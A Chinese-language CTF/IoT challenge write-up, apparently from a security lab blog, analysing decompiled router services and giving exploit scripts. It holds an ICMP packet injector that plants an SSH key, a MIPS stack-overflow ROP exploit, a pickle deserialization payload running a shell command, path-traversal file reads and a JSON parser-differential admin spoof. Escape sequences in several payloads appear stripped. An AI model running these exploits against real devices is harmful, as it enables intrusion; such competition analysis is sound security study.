  v0 = nf_register_net_hooks(&init_net, nf_test_ops, 1);

  if ( v0 >= 0 )

  {

    printk(&_LC4);

    v1 = 0;

  }

  else

  {

    v1 = v0;

    printk(“register nf hook failn”);

  }

  return v1;

}

nf_register_net_hooks函数用来注册netfilter的钩子，其中nf_test_ops为hook函数的nf_hook_ops类型的结构体指针，hook为具体处理逻辑的函数指针，hooknum定义了钩子挂载点的位置。

struct nf_hook_ops

{

        struct list_head list;

        /* User fills in from here down. */

        nf_hookfn *hook;

        struct module *owner;

        u_int8_t pf;

        unsigned int hooknum;

        /* Hooks are ordered in ascending priority. */

        int priority;

};

关于hooknum挂载点的位置可以参考下面的图片，跟iptables的规则概念是一样的：

查看nf_test_ops结构体中，hooknum的值是1，通过查看源码会发现是NF_INET_LOCAL_IN，即对路由到上层协议栈的数据包都会经过一次nf_flow_in_hook这个hook函数进行处理。

参考：

https://zhuanlan.zhihu.com/p/413179209

https://jiansoft.net/2022/08/06/linux_source_code_netfilter.html

此函数会对所有的icmp数据包的内容，对于icmp数据包内容为非ascii的数据包直接放行，其他情况传入到nf_hook_data_modify函数中进行处理：

void __fastcall nf_flow_in_hook(void *priv, sk_buff *skb, const nf_hook_state *state)

{

  int v3; // $v1

  char *v4; // $s0

  char *v5; // $v0

  char *v6; // $a0

  int v7; // $a1

  int v8; // $v1

  v3 = *(skb + 40);

  if ( *(v3 + *(skb + 74) + 9) == 1 )

  {

    v4 = (v3 + *(skb + 73) + 8);

    v5 = &v4[strlen(v4)];

    v6 = v4;

    v7 = 0;

    while ( v5 != v6 )

    {

      v8 = *v6++;

      if ( (v8 – 32) >= 0x5F )

        v7 = -1;

    }

    if ( !v7 )

      nf_hook_data_modify(v4);

  }

}

nf_hook_data_modify函数对传入的数据先进行一次base64_decode解码，再进行rc4的加密，key为X1Hu-2O23，再将加密之后的数据base64编码：

void __fastcall nf_hook_data_modify(char *data)

{

  unsigned __int8 *v2; // $s1

  int v3; // $v0

  char *v4; // $s5

  unsigned int v5; // $v0

  const unsigned __int8 *v6; // $s2

  unsigned int i; // $s0

  int v8; // $v0

  unsigned __int8 key[10]; // [sp+10h] [-10h] BYREF

  v2 = kmem_cache_alloc(kmalloc_caches[10], 3264);

  strcpy(key, “X1Hu-2O23”);

  if ( v2 )

  {

    v3 = strlen(data);

    memset(v2, 0, v3 + 1);

    base64_decode(data, v2);

    if ( strlen(v2) )

    {

      v4 = kmem_cache_alloc(kmalloc_caches[10], 3264);

      if ( v4 )

      {

        v6 = kmem_cache_alloc(kmalloc_caches[10], 3264);

        v5 = strlen(v2);

        rc4_crypt(v2, v5, key, 9u);

        for ( i = 0; i < strlen(v2); ++i )

          sprintf(&v6[i], “%c”, v2[i]);

        v8 = strlen(v6);

        base64_encode(v6, v4, v8);

        strcpy(data, v4);

        kfree(v2);

        kfree(v4);

        kfree(v6);

      }

    }

  }

}

因此此内核模块对数据包进行处理之后，才进入到main二进制的代码逻辑之中。综上可以构造出发送icmp数据包的逻辑代码，REAL_MAC为其他选手的wan口mac地址，ip_addr为选手的ip地址：

#coding: utf-8

from Crypto.Cipher import ARC4

import base64

import sys,os

REAL_MAC = “00:00:00:00:00:20”

ip_addr = “10.10.10.132”

def base64Encode(string):

        oldBin = “”

        tempStr = []

        result = “”

        base64_list = “Gw6Y/H7PxrieDoRSE58h0fcp1jtlbdON9zKVA2g3+aTCy4XmIBuZUsWJnkMqFLQv”

        for ch in string:

                oldBin += “{:08}”.format(int(str(bin(ord(ch))).replace(“0b”, “”)))

        for i in range(0, len(oldBin), 6):

                tempStr.append(“{:<06}”.format(oldBin[i:i + 6]))

        for item in tempStr:

                result = result + base64_list[int(item, 2)]

        if len(result) % 4 == 2:

                result += “==”

        elif len(result) % 4 == 3:

                result += “=”

        return result

def base64Decode(string):

        result = []

        string = string.strip(“=”)

        binstr = “”

        bin6list = []

        bin8list = []

        base64_list = “Gw6Y/H7PxrieDoRSE58h0fcp1jtlbdON9zKVA2g3+aTCy4XmIBuZUsWJnkMqFLQv”

        for ch in string:

                bin6list.append(“{:>06}”.format(str(bin(base64_list.index(ch)).replace(“0b”, “”))))

        binstr = “”.join(bin6list)

        for i in range(0, len(binstr), 8):

                bin8list.append(binstr[i:i + 8])

        for item in range(len(bin8list) – 1):

                result.append(chr(int(bin8list[item], 2)))

        return “”.join(result)

def rc4_encrypt(data, key1):        # 加密

    enc = ARC4.new(key1)

    res = enc.encrypt(data.encode(‘utf-8’))

#    res=base64.b64encode(res)

    res = base64Encode(res)

    return res

def rc4_decrypt(data, key1):        # 解密

    data = base64Decode(data)

#    data = base64.b64decode(data)

    enc = ARC4.new(key1)

    res = enc.decrypt(data)

    return res

def calc_sum(data):

    sum = 0

    for ch in range(len(data)):

        sum^=ord(data[ch])

    return (sum)

if __name__ == “__main__”:

    data = ‘%s@nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp3dwyTC1TfZoNxMXoc3TIdflxH8LydENJIpMaxx21HArlK/TpusiTqqhJS1NLJC6g0y6ujZvvCoqFayi4c+BIoN1ZCVJ1H+Xxx8dlAbHXxQBdQTqKsc3sXzm5jhVSU0aC6mK34ksH9DUeVY8WYSeLJbKhy4IWYnr/ZeZsehiqfFFIbCz4u9SHhAWGGMbHabNqwIJpgVUrileeVIsvuDJ6BGSLLRzEVkpCfNCJpdfmU7PGqtrjYx6tp0F0PVGCB2wgjs64qKdOT3s/IixN5mxdFqw5M0kLNVxT99qnUBdHYz9pAtItIxzAmkHBshZOOOmoVbYMgpUYu4FxrOxAfXeJnn’%(REAL_MAC)  # 需要加密的内容

    key = ‘X1Hu-2O23’  # 加密key

    #print(data)

    encrypt_data = rc4_encrypt(data,key)     # 加密方法

    #print(encrypt_data)

    checksum = calc_sum(data)

    print(“checksum: %d”%(checksum))

    print(“payload: %s”%(encrypt_data))

    docmd = “python2.7 sendPacket.py %s %s %s”%(ip_addr,str(checksum),encrypt_data)

    print(docmd)

    os.system(docmd)

    #enc = “aPLEgUBoSBXzI9==”

    #res = rc4_decrypt(enc, key)

    #print(res)

使用python的socket模块构造出icmp数据包结构就行，sendPacket.py脚本

#!/usr/bin/env python

import os

import sys

import socket

import struct

import select

import time

# python send.py [ip] [checksum] [payload]

def base64Encode(string):

        oldBin = “”

        tempStr = []

        result = “”

        base64_list = “Gw6Y/H7PxrieDoRSE58h0fcp1jtlbdON9zKVA2g3+aTCy4XmIBuZUsWJnkMqFLQv” 

        #base64_list = “dB29nmxlD7oAb/JqL8TtOieyNUSjcp35w0VHZ1Rk6IEhYs4rW+PGKgvQFXfMaCuz”

        for ch in string:

                oldBin += “{:08}”.format(int(str(bin(ord(ch))).replace(“0b”, “”)))

        for i in range(0, len(oldBin), 6):

                tempStr.append(“{:<06}”.format(oldBin[i:i + 6]))

        for item in tempStr:

                result = result + base64_list[int(item, 2)]

        if len(result) % 4 == 2:

                result += “==”

        elif len(result) % 4 == 3:

                result += “=”

        return result

ICMP_ECHO_REQUEST = 8

def icmp_send(dest_addr,pkt_checksum,payload):

    icmp = socket.getprotobyname(“icmp”)

    try:

        my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)

    
except socket.error, (errno, msg):

        if errno == 1:

            msg = msg + “This program must be run with root privileges.”

            raise socket.error(msg)

        raise

    pkt_id = 0xDEAD

    dest_addr  =  socket.gethostbyname(dest_addr)

    pkt_checksum = int(pkt_checksum)

    # Make a dummy heder with a fake checksum.

    header = struct.pack(“bbHHh”, ICMP_ECHO_REQUEST, 0, pkt_checksum, pkt_id, 1)

    packet = header + payload

    my_socket.sendto(packet, (dest_addr, 1))

    my_socket.close()

def usage(name):

    exit(1)

if __name__ == ‘__main__’:

    args = sys.argv

    if len(args) != 4:

        usage(args[0])

    ipaddr = args[1]

    pkt_checksum = args[2]

    payload = args[3]

    icmp_send(ipaddr, pkt_checksum, payload)

server2

查看题目的init服务/etc/init.d/server2，执行了server2二进制：

#!/bin/sh /etc/rc.common

START=97

USE_PROCD=1

PROG=/usr/sbin/server2

start_service() {

procd_open_instance

procd_set_param command “$PROG” “3345”

procd_set_param respawn 3600 2 10000

procd_close_instance

}

reload_service() {

procd_send_signal server2

}

将二进制加载到IDA中，定位到main函数，代码中监听了3345端口（根据init.d文件），传入client_sock调用handle_client函数：

int __cdecl main(int argc, const char **argv, const char **envp)

{

  uint16_t v4; // $v0

  int v5; // $v0

  char *v6; // $s0

  int v7; // $v0

  int listen_sock; // [sp+18h] [+18h]

  int client_sock; // [sp+1Ch] [+1Ch]

  sockaddr_in addr; // [sp+20h] [+20h] BYREF

  sockaddr_in client_addr; // [sp+30h] [+30h] BYREF

  socklen_t client_addr_len[3]; // [sp+40h] [+40h] BYREF

  if ( argc == 2 )

  {

    listen_sock = socket(2, 2, 0);

    addr.sin_family = 2;

    addr.sin_addr.s_addr = htonl(0);

    v4 = atoi(argv[1]);

    addr.sin_port = htons(v4);

    bind(listen_sock, &addr, 0x10u);

    listen(listen_sock, 5);

    v5 = atoi(argv[1]);

    printf(byte_400E2C, v5);

    while ( 1 )

    {

      client_addr_len[0] = 16;

      client_sock = accept(listen_sock, &client_addr, client_addr_len);

      v6 = inet_ntoa(client_addr.sin_addr);

      v7 = ntohs(client_addr.sin_port);

      printf(byte_400E48, v6, v7);

      if ( !fork() )

      {

        dup2(client_sock, 0);

        dup2(client_sock, 1);

        dup2(client_sock, 2);

        handle_client(client_sock);

      }

      sleep(1u);

      close(client_sock);

    }

  }

  printf(byte_400E10, *argv, envp);

  return 0;

}

handle_client函数代码如下：

void __cdecl handle_client(int client_sock)

{

  const char *token; // [sp+18h] [+18h]

  char buffer[1024]; // [sp+20h] [+20h] BYREF

  char password[10]; // [sp+420h] [+420h] BYREF

  char username[10]; // [sp+42Ch] [+42Ch] BYREF

  memset(buffer, 0, sizeof(buffer));

  if ( recv(client_sock, buffer, 0x3FFu, 0) > 0 )

  {

    token = strtok(buffer, ” “);

    if ( token )

    {

      strcpy(username, token);

      token = strtok(0, ” “);

    }

    if ( token )

      strcpy(password, token);

    if ( !strcmp(username, “admin”) && !strcmp(password, “admin123”) )

      secret_function(username);

    else

      puts(byte_400E00);

  }

}

端口接收到的数据放在buffer缓冲区中，根据空格分割buffer到token指针中，接着使用strcpy将token复制到username缓冲区中，由于username缓冲区大小有限，因此这里存在栈溢出漏洞。

通过 username 参数覆盖栈溢出$ra寄存器，跳转到0x400AE8，再通过password 覆盖 $fp 成 0x410C84 地址，

.text:
00400AE8                 addiu   $v0, $fp, 0x438+username

.text:
00400AEC                 move    $a0, $v0         # cmd

.text:
00400AF0                 jal     secret_function

0x410C84-0x42c=0x04110B0（cat /dev/ttyUSB0 地址），此时当作secret_function函数的参数，最终传给system函数并执行。

通过上述简单的rop即可调用到system函数并执行system(“cat /dev/ttyUSB0”)，最终获取到shell。

EXP

import socket

def main():

    remote_ip = “10.10.10.139”

    remote_port = 3345

    con = socket.socket()

    con.settimeout(20)

    try:

        con.connect((remote_ip,int(remote_port)))

    
except Exception as e:

        print(e)

        return

    username = ‘B’*(16)

    username += ‘xE8x0Ax40’ # ‘0x0400AE8’  

    password = “A”*(0x18)+’x84x0Cx41′ # 0x04110B0=0x410C84-0x42c

    payload = ‘{} {}’.format(username, password)

    con.send(payload)

    data = ”

    while 1:

        try:

            d = con.recv(1024)

        
except:

            break

        if d==”:

            break

        data = data+d

    print(data)

    con.close()

if __name__==’__main__’:

    main()

pbk

本题实现了一套简单的前后端交互系统，前端使用 python 初步处理用户数据，对请求进行鉴权，后端实现具体业务功能。

鉴权部分使用了本地配置文件 /etc/accounts.ini，账户格式为

username:
hash_password:
role|

role 字段定义了该用户的角色，guest 为访客，admin 为管理员。默认状态下存在两个用户，guest 和 admin，通过查询 guest 的 md5 密码可知也为 guest。通过身份验证之后程序会返回一 sessionid

鉴权代码

def auth_check(self, session_id):

        try:

            if not os.path.exists(“/tmp/session/” + session_id):

                return False

            f = open(“/tmp/session/” + session_id, “rb”)

            _session = pickle.loads(f.read())

            f.close()

            current_time = int(time.time())

            if current_time – _session.login_time > _session.lease:

                return False

            return _session.role

        
except:

            return False

此处获取用户 sessionid，拼接一个路径，打开此文件并对其中的内容进行反序列化，读取结果的 login_time 字段判断 session 是否过期。拼接路径时没有对 sessionid 进行限制，如果可以构造可控文件，那么这里就存在反序列化漏洞。

前后端使用 json 格式数据进行通信，后端收到 json 数据首先进行解析，获取其中的 f 和 r 参数

f 代表调用后端哪个功能，r 表示当前用户的角色

guest 用户可以使用 0x70 和 0x23 两个功能，分别对应 get_version 和 upload_file

string get_version(json_object* obj){

    JsonHelper* json_helper;

    string option = json_helper->GetString(obj, “o”);

    string path_prefix = “/tmp/”;

    ifstream version_file;

    version_file.open(path_prefix + option);

    string content;

    version_file >> content;

    version_file.close();

    string res = “{“c”:””}”;

    json_object* res_obj = json_helper->StrToJson(res.c_str());

    json_helper->SetString(res_obj, “c”, content.c_str());

    return json_helper->JsonToStr(res_obj);

}

string upload_file(json_object* obj){

    JsonHelper* json_helper;

    string path = json_helper->GetString(obj, “p”);

    string content = json_helper->GetString(obj, “c”);

    string decode_content = base64_decode(content);

    ofstream target_file;

    string path_prefix = “/tmp/uploads/”;

    target_file.open(path_prefix + path);

    target_file << decode_content;

    target_file.close();

    string res = “{“c”:””}”;

    json_object* res_obj = json_helper->StrToJson(res.c_str());

    json_helper->SetString(res_obj, “c”, content.c_str());

    return json_helper->JsonToStr(res_obj);

}

get_version 功能存在任意文件读取，可以直接获取 flag，而 upload_file 功能可以写入任意文件，我们结合此功能即可利用前端的反序列化漏洞，

后端中 admin 账户可以调用调试功能，直接执行系统命令，但是 admin 的密码无法破解出来。不过我们分析前后端 json 处理的过程

bool Request::
ParseRequest(char* raw_data){

    JsonHelper* json_helper = new JsonHelper();

    obj = json_helper->StrToJson(raw_data);

    func = json_helper->GetInt(obj, “f”);

    role = json_helper->GetString(obj, “r”);

    return true;

}

if p.type == b”0102″:

    parsed_data = json.loads(p.data, strict=False)

可以看到 python 部分在解析 json 数据时使用了 strict=False 参数，添加此参数后 json 可以包含 unicode 数据。而后端采用了 json-c 对数据进行解析，json-c 对包含 unicode 的数据解析结果和 python 存在差异，例如我们构造 {“r”:”123″,”ru0000″:”456″}，python 会认为这是两个不同的 key，最后得到 r = 123。而相同的数据使用 json-c 进行解析，r 的结果会变成 456

利用这一点结合后端鉴权方式，我们可以伪造一个 admin 身份，从而使用后端的调试功能执行命令。

EXP

import socket

import json

import sys

def method1():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((IP, 12345))

    login_guest = ‘NOVA00010102{“usr”:”guest”,”pwd”:”guest”,”func”:1}’

    s.sendall(login_guest.encode())

    res = s.recv(1024)

    res_status = json.loads(res).get(“result”)

    guest_session_id = json.loads(res).get(“data”).get(“session_id”)

    if (res_status != “1”) or (len(guest_session_id) != 32):

        print(“method1 guest login failed”)

        exit(0)

    guest_upload = ‘NOVA00010102{“session_id”:”%s”,”func”:18,”f”:35,”p”:”test_session”,”c”:”gASVLwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBR0b3VjaCAvaGFja2VkX2J5X25wY5SFlFKULg==”}’ % (guest_session_id)

    s.sendall(guest_upload.encode())

    res = s.recv(1024)

    logout = ‘NOVA00010102{“session_id”:”/../uploads/test_session”,”func”:16}’

    s.sendall(logout.encode())

    res = s.recv(1024)

    s.close()

def method2():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((IP, 12345))

    login_guest = ‘NOVA00010102{“usr”:”guest”,”pwd”:”guest”,”func”:1}’

    s.sendall(login_guest.encode())

    res = s.recv(1024)

    res_status = json.loads(res).get(“result”)

    guest_session_id = json.loads(res).get(“data”).get(“session_id”)

    if (res_status != “1”) or (len(guest_session_id) != 32):

        print(“method2 guest login failed”)

        exit(0)

    backend1 = ‘NOVA00010102{“session_id”:”%s”,”func”:18,”f”:
112,”o”:”/../../dev/ttyUSB0″}’ % guest_session_id

    s.sendall(backend1.encode())

    res = s.recv(1024)

    print(res)

def method3():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((IP, 12345))

    login_guest = ‘NOVA00010102{“usr”:”guest”,”pwd”:”guest”,”func”:1}’

    s.sendall(login_guest.encode())

    res = s.recv(1024)

    res_status = json.loads(res).get(“result”)

    guest_session_id = json.loads(res).get(“data”).get(“session_id”)

    if (res_status != “1”) or (len(guest_session_id) != 32):

        print(“method2 guest login failed”)

        exit(0)

    backend1 = ‘NOVA00010102{“session_id”:”%s”,”func”:18,”f”:32,”d”:”touch /hacked_by_npc”,”r”:”admin”,”ru0000″:”admin”}’ % guest_session_id

    s.sendall(backend1.encode())

    res = s.recv(1024)

    print(res)

if __name__ == “__main__”:

    if len(sys.argv) != 3:

        print(“python3 checker.py”)

        exit(0)

    IP = sys.argv[1]

    method = sys.argv[2]

    if method == “1”:

        method1()

    elif method == “2”:

        method2()

    elif method == “3”:

        method3()

ble

用户需要传入特定格式的请求，其中 payload 部分为 protobuf 序列化的数据。

基本格式为

message  ControlMsg{

required uint64 id = 1;

required uint64 opcode = 2;

  required string params = 3; 

}

程序中主要使用了 id 字段，当 id 等于 3 时，程序会利用蓝牙芯片扫描附近的 BLE 信号。

.text:
00400EEC                 jal     system

.text:
00400EF0                 nop

from pwn import *

import base64

context.log_level = “DEBUG”

blue_open   = “CAEQAhoBTA==”

blue_close  = “CAEQARoBTA==”

green_open  = “CAIQAhoBTA==”

green_close = “CAIQARoBTA==”

scan_bluetooth = “CAMQAhoBVw==”

get_rand_name = “CAQQAhoBVw==”

connect_wlan  = “CAUQAhoBVw==”

exec_file     = “CAYQAhoBVw==”

p = remote(“10.10.10.132”, 50413)

# test leds

p.sendline(b”x01x05x04x02x01x00x00x010007″ + base64.b64decode(blue_open.encode()))

sleep(1)

p.sendline(b”x01x05x04x02x01x00x00x010007″ + base64.b64decode(blue_close.encode()))

sleep(1)

p.sendline(b”x01x05x04x02x01x00x00x010007″ + base64.b64decode(green_open.encode()))

sleep(1)

p.sendline(b”x01x05x04x02x01x00x00x010007″ + base64.b64decode(green_close.encode()))

sleep(1)

# scan bluetooth

p.sendline(b”x01x05x04x02x01x00x00x010007″ + base64.b64decode(scan_bluetooth.encode()))

sleep(1)

# test wlan

p.sendline(b”x01x05x04x02x01x00x00x010007″ + base64.b64decode(get_rand_name.encode()))

print(p.recv())

raw_input()

p.sendline(b”x01x05x04x02x01x00x00x010007″ + base64.b64decode(connect_wlan.encode()))

sleep(5)

p.sendline(b”x01x05x04x02x01x00x00x010007″ + base64.b64decode(exec_file.encode()))

p.interactive()

未完待续

是安恒信息的智慧大脑，也是信息安全领域前沿技术研究部门。拥有数百位安全研究员和技术研发。目前设有十大实验室，研究领域涉及数十个方向，为公司产品、服务持续赋能，提供专业的技术能力支撑。

网络安全研究宅基地

扫码关注我们

一群技术宅

---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/2-1679965628.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/2-1679965628.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/10-1679965628.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/8-1679965629.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/1-1679965629.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/9-1679965629.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/8-1679965630.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/3-1679965630.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/7-1679965630.jpeg)